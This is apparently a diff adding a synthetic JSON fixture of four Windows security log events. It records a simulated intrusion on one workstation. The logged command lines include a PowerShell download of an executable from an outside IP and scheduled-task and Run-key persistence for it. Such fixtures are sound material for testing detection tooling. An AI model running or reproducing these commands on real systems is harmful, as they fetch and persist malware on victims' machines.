@@ -1,0 +1,120 @@
+[
+  {
+    "id": "INC003-0001",
+    "timestamp": "2026-09-28T22:41:00.000Z",
+    "agent": {
+      "id": "001",
+      "name": "ENG-WKS-030",
+      "ip": "10.20.5.11"
+    },
+    "rule": {},
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ENG-WKS-030"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -c \"iwr http://45.77.12.8/upd.exe -OutFile $env:APPDATA\\upd.exe\"",
+          "processGuid": "{cccc3333-0000-0000-0003-000000000001}",
+          "processId": "7020",
+          "parentImage": "C:\\Windows\\System32\\cmd.exe",
+          "user": "CORP\\dlee"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC003-0002",
+    "timestamp": "2026-09-28T22:41:05.000Z",
+    "agent": {
+      "id": "001",
+      "name": "ENG-WKS-030",
+      "ip": "10.20.5.11"
+    },
+    "rule": {},
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ENG-WKS-030"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\schtasks.exe",
+          "commandLine": "schtasks /create /tn \"UpdaterSvc\" /tr \"C:\\Users\\dlee\\AppData\\Roaming\\upd.exe\" /sc onlogon /rl highest /f",
+          "processGuid": "{cccc3333-0000-0000-0003-000000000002}",
+          "processId": "7044",
+          "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parentProcessGuid": "{cccc3333-0000-0000-0003-000000000001}",
+          "user": "CORP\\dlee"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC003-0003",
+    "timestamp": "2026-09-28T22:41:05.400Z",
+    "agent": {
+      "id": "001",
+      "name": "ENG-WKS-030",
+      "ip": "10.20.5.11"
+    },
+    "rule": {
+      "id": "92100",
+      "level": 10,
+      "description": "Scheduled task created"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Security-Auditing",
+          "eventID": "4698",
+          "channel": "Security",
+          "computer": "ENG-WKS-030"
+        },
+        "eventdata": {
+          "taskName": "\\UpdaterSvc",
+          "subjectUserName": "dlee",
+          "subjectDomainName": "CORP",
+          "taskContent": "<Task><Actions><Exec><Command>C:\\Users\\dlee\\AppData\\Roaming\\upd.exe</Command></Exec></Actions></Task>"
+        }
+      }
+    }
+  },
+  {
+    "id": "INC003-0004",
+    "timestamp": "2026-09-28T22:41:08.000Z",
+    "agent": {
+      "id": "001",
+      "name": "ENG-WKS-030",
+      "ip": "10.20.5.11"
+    },
+    "rule": {
+      "id": "92101",
+      "level": 10,
+      "description": "Registry Run key value set"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "eventID": "13",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ENG-WKS-030"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\reg.exe",
+          "targetObject": "HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+          "details": "C:\\Users\\dlee\\AppData\\Roaming\\upd.exe",
+          "processGuid": "{cccc3333-0000-0000-0003-000000000003}",
+          "user": "CORP\\dlee"
+        }
+      }
+    }
+  }
+]
